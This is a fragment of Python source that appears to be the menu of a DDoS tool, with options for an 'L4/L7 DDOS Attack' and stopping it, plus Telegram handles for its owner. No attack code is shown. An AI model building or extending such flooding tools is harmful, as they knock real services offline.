{Color.LC}BBOS{Color.LR} -> {Color.LY}L4/L7 DDOS Attack
{Color.LC}STOP{Color.LR} -> {Color.LY}Stop Your Attack

{Color.LG}DEV{Color.LR} -> {Color.LB}ContactDev"""
	dev = f"""{Color.LC}Telegram{Color.LR}: {Color.LY}\n  Owner{Color.LR}:{Color.LY}  @tubi2022\n  tuấndz{Color.LR}:{Color.LY}  @Ms_Yor"""
	F_Home = Home(commands, dev)
	F_Tool = Tool(commands, dev)
	try:
		with open('t.py'):main()
	except:
		status.Exit(obj=None)